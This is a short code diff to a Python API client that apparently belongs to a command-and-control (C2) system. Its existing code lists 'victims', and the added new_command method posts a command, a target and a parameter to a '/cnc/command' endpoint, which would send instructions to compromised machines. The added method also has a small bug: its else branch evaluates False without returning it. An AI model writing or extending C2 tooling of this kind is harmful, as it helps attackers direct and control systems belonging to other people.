@@ -28,7 +28,14 @@ class Api:
             return Api.__GENERATE_VICTIM_STRUCT(r)
         else:
             return None
-
+    def new_command(command: str, target: str, parameter: str | None = None):
+        Data = {"command": command, "target": target, "parameter": str(parameter)}
+        r = requests.post(API+ "/cnc/command", json=Data).json()
+        print(r)
+        if r["Status"]:
+            return True
+        else:
+            False
 
 if __name__ == "__main__":
     print(Api.get_all_victims())
